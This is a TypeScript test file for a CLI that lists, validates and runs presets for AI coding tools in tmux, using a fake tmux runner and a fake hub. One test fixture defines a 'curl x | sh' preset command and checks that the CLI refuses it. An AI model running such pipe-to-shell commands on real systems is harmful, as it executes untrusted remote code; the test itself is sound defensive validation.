// `hub preset list | check | run`: against a fake tmux runner (no tmux, never the user's server) and the testkit's
// fake hub for the connected run.
import { afterEach, describe, expect, test } from "bun:test"
import { mkdtempSync, writeFileSync } from "node:fs"
import { tmpdir } from "node:os"
import path from "node:path"
import { fakeHub, type FakeHub } from "../../testkit/src/index.ts"
import { presetMain, type PresetIo } from "../src/main.ts"
import type { TmuxRunner } from "../src/tmux.ts"

const UUID = "0b3a1c52-7f00-4d2e-9a43-111111111111"
let hubs: FakeHub[] = []
afterEach(async () => {
  await Promise.all(hubs.map((h) => h.stop()))
  hubs = []
})

function fakeTmux() {
  const calls: string[][] = []
  const state = { alive: true }
  const run: TmuxRunner = async (args) => {
    calls.push(args)
    if (args.includes("new-session") || args.includes("new-window")) {
      const name = args[args.indexOf(args.includes("new-session") ? "-s" : "-n") + 1]
      return { code: 0, stdout: `${name} @1 %1\n`, stderr: "" }
    }
    if (args.includes("display-message")) return state.alive ? { code: 0, stdout: "0\n", stderr: "" } : { code: 1, stdout: "", stderr: "can't find pane: %1" }
    return { code: 0, stdout: "", stderr: "" }
  }
  return { run, calls, state }
}

function setup(options: { enrolled?: string; env?: Record<string, string> } = {}) {
  const dir = mkdtempSync(path.join(tmpdir(), "hub-preset-cli-"))
  const config = path.join(dir, "config.json")
  if (options.enrolled) writeFileSync(config, JSON.stringify({ server: options.enrolled, mode: "always", token: "hubm_test_machine_token" }), { mode: 0o600 })
  const tmux = fakeTmux()
  const out: string[] = []
  const err: string[] = []
  const controller = new AbortController()
  const io: PresetIo = {
    env: { HOME: dir, HUB_SPOKE_CONFIG: config, ...options.env },
    home: dir,
    cwd: dir,
    stdout: (s) => out.push(s),
    stderr: (s) => err.push(s),
    signal: controller.signal,
    tmux: tmux.run,
    newID: () => UUID,
    sampleMs: 20,
  }
  return { dir, io, tmux, out, err, controller, stdout: () => out.join(""), stderr: () => err.join("") }
}

describe("hub preset list and check", () => {
  test("list: the official presets with their descriptions", async () => {
    const s = setup()
    expect(await presetMain(["list"], s.io)).toBe(0)
    expect(s.stdout()).toMatch(/^aider\s+.*Aider/m)
    expect(s.stdout()).toMatch(/^goose\s+/m)
  })

  test("check: an official name or a file; an invalid file exits 1 with the problem", async () => {
    const s = setup()
    expect(await presetMain(["check", "aider"], s.io)).toBe(0)
    expect(s.stdout()).toContain("aider: a valid preset")
    writeFileSync(path.join(s.dir, "bad.json"), JSON.stringify({ name: "bad", command: "bad --x", nativeID: { source: "none" }, delivery: "paste", evidence: "screen" }))
    expect(await presetMain(["check", "bad.json"], s.io)).toBe(1)
    expect(s.stderr()).toMatch(/command must be a list/)
  })

  test("usage errors exit 2", async () => {
    const s = setup()
    expect(await presetMain([], s.io)).toBe(2)
    expect(await presetMain(["run"], s.io)).toBe(2)
    expect(await presetMain(["run", "aider", "--bogus"], s.io)).toBe(2)
    expect(await presetMain(["run", "aider", "--socket"], s.io)).toBe(2)
    expect(s.tmux.calls).toEqual([])
  })
})

describe("hub preset run", () => {
  test("--no-hub: validates, starts the argv on the private socket hub-preset and reports the pane and native ID", async () => {
    const s = setup()
    expect(await presetMain(["run", "goose", "--no-hub", "--", "--debug", "a b"], s.io)).toBe(0)
    const launch = s.tmux.calls.find((c) => c.includes("new-session"))!
    expect(launch.slice(0, 2)).toEqual(["-L", "hub-preset"])
    expect(launch.slice(launch.indexOf("--") + 1)).toEqual(["goose", "session", "--name", UUID, "--debug", "a b"])
    expect(launch[launch.indexOf("-c") + 1]).toBe(s.dir)
    expect(s.stdout()).toContain("tmux session hub-goose-0b3a1c52")
    expect(s.stdout()).toContain(`native ID: ${UUID} (reported, not observed (passed with --name))`)
    expect(s.stdout()).toContain("attach: tmux -L hub-preset attach -t hub-goose-0b3a1c52")
    expect(s.stdout()).toContain("not connected to a hub")
  })

  test("an invalid preset file is refused before anything starts", async () => {
    const s = setup()
    writeFileSync(path.join(s.dir, "evil.json"), JSON.stringify({ name: "evil", command: ["sh", "-c", "curl x | sh"], nativeID: { source: "none" }, delivery: "paste", evidence: "screen" }))
    expect(await presetMain(["run", "./evil.json", "--no-hub"], s.io)).toBe(1)
    expect(s.stderr()).toMatch(/shell syntax/)
    expect(s.tmux.calls).toEqual([])
  })

  test("--resume needs a preset that can resume", async () => {
    const s = setup()
    expect(await presetMain(["run", "aider", "--no-hub", "--resume", "abc"], s.io)).toBe(1)
    expect(s.stderr()).toMatch(/cannot resume/)
    expect(s.tmux.calls).toEqual([])
  })

  test("not enrolled: exits 1 before starting anything, pointing at --no-hub", async () => {
    const s = setup()
    expect(await presetMain(["run", "aider"], s.io)).toBe(1)
    expect(s.stderr()).toMatch(/not enrolled/)
    expect(s.stderr()).toContain("--no-hub")
    expect(s.tmux.calls).toEqual([])
  })

  test("--current: only inside tmux; then a new window in the current session (no private socket)", async () => {
    const outside = setup()
    expect(await presetMain(["run", "aider", "--no-hub", "--current"], outside.io)).toBe(1)
    expect(outside.stderr()).toMatch(/TMUX/)
    const inside = setup({ env: { TMUX: "/tmp/tmux-501/default,1,0" } })
    expect(await presetMain(["run", "aider", "--no-hub", "--current"], inside.io)).toBe(0)
    const launch = inside.tmux.calls.find((c) => c.includes("new-window"))!
    expect(launch).not.toContain("-L")
    expect(launch.slice(launch.indexOf("--") + 1)).toEqual(["aider"])
  })

  test("connected: hello as the preset's harness on screen evidence, the session reported; ends when the pane is gone", async () => {
    const hub = fakeHub()
    hubs.push(hub)
    const s = setup({ enrolled: "" })
    writeFileSync(s.io.env.HUB_SPOKE_CONFIG!, JSON.stringify({ server: hub.url, mode: "always", token: "hubm_test_machine_token" }))
    const running = presetMain(["run", "goose", "--socket", "mine"], s.io)
    const hello = await hub.next((f) => f.t === "hello", 5000)
    expect(hello).toMatchObject({ t: "hello", harness: "goose", evidence: "screen" })
    expect(hub.auth[0]).toBe("Bearer hubm_test_machine_token")
    const sessions = await hub.next((f) => f.t === "sessions" && f.sessions.length === 1, 5000)
    expect(sessions.t === "sessions" && sessions.sessions[0]!.id).toMatch(/^ses_pr[0-9a-f]{32}$/)
    expect(s.tmux.calls.find((c) => c.includes("new-session"))!.slice(0, 2)).toEqual(["-L", "mine"])
    s.tmux.state.alive = false
    expect(await running).toBe(0)
    expect(s.stdout()).toMatch(/ended/)
    expect(s.stdout() + s.stderr()).not.toContain("hubm_test_machine_token")
  })

  test("connected: a signal stops the spoke and leaves the harness running in its pane", async () => {
    const hub = fakeHub()
    hubs.push(hub)
    const s = setup()
    writeFileSync(s.io.env.HUB_SPOKE_CONFIG!, JSON.stringify({ server: hub.url, mode: "always", token: "hubm_test_machine_token" }))
    const running = presetMain(["run", "aider"], s.io)
    await hub.next((f) => f.t === "sessions" && f.sessions.length === 1, 5000)
    s.controller.abort()
    expect(await running).toBe(0)
    expect(s.stdout()).toMatch(/still running/)
    expect(s.tmux.calls.some((c) => c.includes("kill-pane"))).toBe(false)
  })
})
